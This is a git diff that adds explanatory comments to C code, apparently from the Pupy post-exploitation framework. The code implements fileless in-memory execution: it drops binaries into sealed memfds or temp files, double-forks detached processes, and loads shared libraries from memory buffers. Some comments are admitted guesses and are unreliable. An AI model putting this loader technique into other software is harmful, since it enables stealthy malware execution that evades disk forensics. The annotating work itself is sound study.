@@ -36,6 +36,8 @@ extern char **environ;
 
 */
 
+// gettemptpl gets the first effective 
+// template for drop_library
 static inline
 const char *gettemptpl() {
     static const char *templates[] = {
@@ -50,16 +52,32 @@ const char *gettemptpl() {
     };
 
     static const char *tmpdir = NULL;
+    // weird check... but okay
     if (! tmpdir) {
         int i;
+	// for each template
         for (i=0; templates[i]; i++) {
+	    // allocate some memory for the 
+	    // current template
             char *buf = alloca(strlen(templates[i]+1));
+
+	    // copy the template over
             strcpy(buf, templates[i]);
+
+	    // get a filedesc for a tempfile
             int fd = mkstemp(buf);
+
             int found = 0;
             if (fd != -1) {
+		// get the page size for mem on system
                 int page_size = sysconf(_SC_PAGESIZE);
+
+		// truncate the tempfile to the memory 
+		// page size for memory mapping
                 if (ftruncate(fd, page_size) != -1) {
+		    // assuming this doesn't 
+		    // fail we map some memory
+		    // to test the file location
                     void *map = mmap(
                         NULL,
                         page_size,
@@ -72,6 +90,9 @@ const char *gettemptpl() {
                         fd,
                         0
                     );
+		    // if map failed
+		    // then fail the 
+		    // template check
                     if (map != MAP_FAILED) {
                         munmap(map, page_size);
                         found = 1;
@@ -80,6 +101,8 @@ const char *gettemptpl() {
                     }
                 }
 
+		// destroy our 
+		// test file
                 unlink(buf);
                 close(fd);
 
@@ -92,10 +115,13 @@ const char *gettemptpl() {
 
         }
         if (!tmpdir) {
+	    // if we can't find a viable 
+	    // temp dir, freak out and 
+	    // panic
             abort();
         }
     }
-
+    // we return the successful template
     return tmpdir;
 }
 
@@ -129,6 +155,8 @@ bool search_library(void *pState, void *pData) {
 }
 
 int drop_library(char *path, size_t path_size, const char *buffer, size_t size) {
+
+/* this section just gets somewhere to write */
 #if defined(Linux)
     int fd = pupy_memfd_create(path, path_size);
     bool memfd = true;
@@ -143,6 +171,10 @@ int drop_library(char *path, size_t path_size, const char *buffer, size_t size) 
     bool memfd = false;
 #endif
 
+/* got fd (if memfd worked */
+
+    // if no memfd go with an 
+    // tempfile drop
     if (fd < 0) {
         dprint("pupy_memfd_create() failed: %m\n");
         memfd = false;
@@ -160,6 +192,9 @@ int drop_library(char *path, size_t path_size, const char *buffer, size_t size) 
         }
     }
 
+    // if the buffer we got is compressed
+    // decompress it and write to out
+    // the fd we got
     if (size > 2 && buffer[0] == '\x1f' && buffer[1] == '\x8b') {
         dprint("Decompressing library %s\n", path);
         int r = decompress(fd, buffer, size);
@@ -168,6 +203,8 @@ int drop_library(char *path, size_t path_size, const char *buffer, size_t size) 
             close(fd);
             return -1;
         }
+    // if we got uncompressed data
+    // write it straight up
     } else {
         while (size > 0) {
             size_t n = write(fd, buffer, size);
@@ -178,6 +215,7 @@ int drop_library(char *path, size_t path_size, const char *buffer, size_t size) 
                 fd = -1;
                 break;
             }
+	    // write till done
             buffer += n;
             size -= n;
         }
@@ -185,6 +223,7 @@ int drop_library(char *path, size_t path_size, const char *buffer, size_t size) 
 
 #ifdef Linux
     if (memfd) {
+	// if we are on linux and can memfd, then seal file writing (prevent)
         fcntl(fd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE);
     }
 #endif
@@ -192,6 +231,8 @@ int drop_library(char *path, size_t path_size, const char *buffer, size_t size) 
     return fd;
 }
 
+// helper function to set cloexec flag
+// (which closes the exe fd on execution)
 static inline int
 set_cloexec_flag (int desc) {
     int oldflags = fcntl (desc, F_GETFD, 0);
@@ -201,26 +242,36 @@ set_cloexec_flag (int desc) {
     return fcntl (desc, F_SETFD, oldflags);
 }
 
+// this executes a plain elf exe in memory (or tempfd)
 pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdior[3], bool redirected_stdio, bool detach) {
     dprint("memexec(%p, %ull, %d)\n", buffer, size, redirected_stdio);
 
     char buf[PATH_MAX]={};
+    // get a fd for loading use
     int fd = drop_library(buf, sizeof(buf), buffer, size);
     if (fd < 0) {
         dprint("Couldn't drop executable: %m\n");
         return -1;
     }
 
+    // define some pipes for use
+    // later
     int p_wait[2];
     int p_stdin[2];
     int p_stdout[2];
     int p_stderr[2];
 
+    // get a pipe for communication
+    // between the cradle fork proc 
+    // and the parent proc
     if (pipe(p_wait) < 0) {
         dprint("Couldn't create wait pipe: %m\n");
         goto _lbClose;
     }
 
+    // if we are redirecting 
+    // then create the pipes
+    // for them as well
     if (redirected_stdio) {
         if (pipe(p_stdin) < 0)
             goto _lbClose0;
@@ -233,6 +284,14 @@ pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdi
     }
 
     pid_t pid = 0;
+    // if we are detaching the
+    // process we then
+    // go ahead with a fork now
+    // as to make it so our
+    // child process will handle
+    // it's connection to the 
+    // child child process that
+    // will then fork&exec 
     if (detach) {
         pid = fork();
         if (pid == -1) {
@@ -241,29 +300,51 @@ pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdi
         }
     }
 
+    // if we are the child (pid 0)
     if (!pid) {
+	// call fork again :|
         pid = fork();
         if (pid == -1) {
             exit(1);
         }
-
+	// if we are the parent then
+	// write the pid to the child
+	// with the wait-pipe
         if (pid) {
             if (detach) {
                 write(p_wait[1], &pid, sizeof(pid));
                 exit(0);
             }
+	// otherwise we are the child
+	// and we set up the execution
+	// enviroment
         } else {
             if (redirected_stdio) {
+		// set the read side of the pipe
+		// to stdin and close the write end
                 dup2(p_stdin[0], 0);  close(p_stdin[1]);
+		// for the stdout,err side we set the 
+		// write end as our end of the pipe 
+		// and close the read side of the pipe
                 dup2(p_stdout[1], 1); close(p_stdout[0]);
                 dup2(p_stderr[1], 2); close(p_stderr[0]);
+		// then we close the wait pipes read side 
+		// as we will be writing the exec'd procs
+		// errors to it
                 close(p_wait[0]);
             } else {
+		// otherwise we do some
+		// tomfoolery that results
+		// in stdin being the fd
+		// for std in?
+		// I don't know - this is a guess
                 int i;
 
                 if (setsid ( ) == -1)
                     return -1;
 
+		// oh yeah, and we close everything that
+		// is not the p-wait pipe
                 for (i = 0; i < sysconf(_SC_OPEN_MAX); i++)
                     if (i != p_wait[1])
                         close(i);
@@ -272,17 +353,29 @@ pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdi
                 dup (0);
                 dup (0);
             }
-
+		
+	    // we set the cloexec flag
+	    // on the write side of the
+	    // wait pipe
             set_cloexec_flag(p_wait[1]);
 
+	    // actually execute the binary
+	    // causing this child's image
+	    // to be the exe'd process,
+	    // execpt the dup'd file desciptors 
             execv(buf, (char *const *) argv);
 
             int status = errno;
+	    // now we write any errors back to the
+	    // parent
             write(p_wait[1], &status, sizeof(status));
+	    // then we exit the cradle process
             exit(1);
         }
     }
 
+    // back to this proc (parent)
+    // we close the write side of wait
     close(p_wait[1]);
     p_wait[1] = -1;
 
@@ -290,12 +383,16 @@ pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdi
     int error = 0;
     pid_t child_pid = 0;
 
+    // if we are detaching
     if (detach) {
+	// read the pid 
+	// from the child cradle proc
         if (read(p_wait[0], &child_pid, sizeof(child_pid)) < 0) {
             dprint("Reading child pid failed: %m\n");
             goto _lbClose3;
         }
 
+	// wait for the process to exit
         if (waitpid(pid, &status, 0) < 0 || WEXITSTATUS(status) != 0) {
             dprint("Invalid child state\n");
             goto _lbClose3;
@@ -309,6 +406,8 @@ pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdi
 
     dprint("Wait exec status...\n");
 
+    // now read the error value of the
+    // executed process
     if (read(p_wait[0], &error, sizeof(error)) < 0) {
         dprint("Reading error failed: %m\n");
         goto _lbClose3;
@@ -318,6 +417,8 @@ pid_t memexec(const char *buffer, size_t size, const char* const* argv, int stdi
     if (error)
         goto _lbClose3;
 
+    // clean up the 
+    // redirected fds
     dprint("Child at %d\n", child_pid);
     if (redirected_stdio) {
         close(p_stdin[0]);  stdior[0] = p_stdin[1];
@@ -404,9 +505,12 @@ struct link_map_private {
 
 };
 
+// internal memory exec enabled version of dlopen
 static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
     void *handle = NULL;
-
+// if we are using a linkmap to 
+// supplement our call define it
+// and get the handle 
 #if defined(WIP_LMID)
     static Lmid_t lmid = LM_ID_NEWLM;
 
@@ -420,7 +524,7 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
         dlinfo(handle, RTLD_DI_LMID, &lmid);
         dprint("memdlopen - dlmopen - new lmid created: %08x\n", lmid);
     }
-
+// otherwise we use a normal dlopen
 #else
     static Lmid_t lmid = LM_ID_BASE;
     handle = dlopen(path, flags);
@@ -428,10 +532,13 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
 
     dprint("memdlopen - dlmopen - _dlopen(lmid=%08x, %s, %s)\n", lmid, path, soname);
 
+    // if we are useing noload and a handle
+    // exits return the handle
     if (flags & RTLD_NOLOAD || !handle) {
         return handle;
     }
 
+    // check and see if we can memfd
     bool is_memfd = is_memfd_path(path);
     bool linkmap_hacked = false;
 
@@ -443,6 +550,7 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
         */
 
         if (is_memfd) {
+	    // if we can memfd set up the linkmap (TODO: more detail)
             if (linkmap && linkmap->l_ns == lmid &&
                 linkmap->l_libname && linkmap->l_libname->name &&
                 !strncmp(linkmap->l_name, linkmap->l_libname->name, strlen(linkmap->l_name))) {
@@ -490,14 +598,20 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
 
     static const char DROP_PATH[] = "/dev/shm/memfd:";
 
+    // if we can use mem file descriptors
     if (is_memfd) {
         int i;
 
+	// append sopath to the 
+	// /dev/shm/memfd: string
         snprintf(fake_path, sizeof(fake_path), "%s%s", DROP_PATH, soname);
         for (i=sizeof(DROP_PATH)-1; fake_path[i]; i++)
+	    // replace / with !
             if (fake_path[i] == '/')
                 fake_path[i] = '!';
 
+	// if we cannot symlink then
+	// we decare this non memfd able
         if (!symlink(path, fake_path)) {
             effective_path = fake_path;
             is_memfd = false;
@@ -506,6 +620,8 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
         }
     }
 
+    // now we use real dlopen to open our
+    // found temp or memfd path
     void *handle = dlopen(effective_path, flags);
     if (fd != -1) {
         unlink(effective_path);
@@ -520,24 +636,37 @@ static void *_dlopen(int fd, const char *path, int flags, const char *soname) {
 }
 #endif
 
+
+// this one is pretty critical
+// This implements the list search of 
+// currently loaded modules and
+// loads new modules (used by
+// import_module) later
 void *memdlopen(const char *soname, const char *buffer, size_t size) {
     dprint("memdlopen(\"%s\", %p, %ull)\n", soname, buffer, size);
 
+    // internally implmenented list
+    // data structure
     static PLIST libraries = NULL;
     if (!libraries) {
         libraries = list_create();
     }
 
+    // create our search entry
     library_t search = {
         .name = soname,
         .base = NULL,
     };
 
+    // if the library id found the search_library callback 
+    // sets search.base to the handle (base addr of) the
+    // already loaded module
     if (list_enumerate(libraries, search_library, &search)) {
         dprint("SO %s FOUND: %p\n", search.name, search.base);
         return search.base;
     }
 
+    // call our internal dlopen (arch dependent)
     void *base = _dlopen(-1, soname, RTLD_NOLOAD, NULL);
     if (base) {
         dprint("Library \"%s\" loaded from OS\n", soname);
@@ -551,6 +680,8 @@ void *memdlopen(const char *soname, const char *buffer, size_t size) {
         strncpy(buf, soname, sizeof(buf)-1);
 #endif
 
+    // if that all didn't work, then we have to 
+    // resort to a tempfile 
     int fd = drop_library(buf, sizeof(buf)-1, buffer, size);
 
     if (fd < 0) {
@@ -560,6 +691,7 @@ void *memdlopen(const char *soname, const char *buffer, size_t size) {
 
     int flags = RTLD_NOW | RTLD_LOCAL;
 
+    // call out dlopen on the tempfile
     dprint("dlopen(%s, %08x)\n", buf, flags);
     base = _dlopen(fd, buf, flags, soname);
     dprint("dlopen(%s, %08x) = %p\n", buf, flags, base);
@@ -571,6 +703,7 @@ void *memdlopen(const char *soname, const char *buffer, size_t size) {
 
     dprint("Library %s loaded to %p\n", soname, base);
 
+    // add new entry to loaded files and return handle
     library_t *record = (library_t *) malloc(sizeof(library_t));
     record->name = strdup(soname);
     record->base = base;
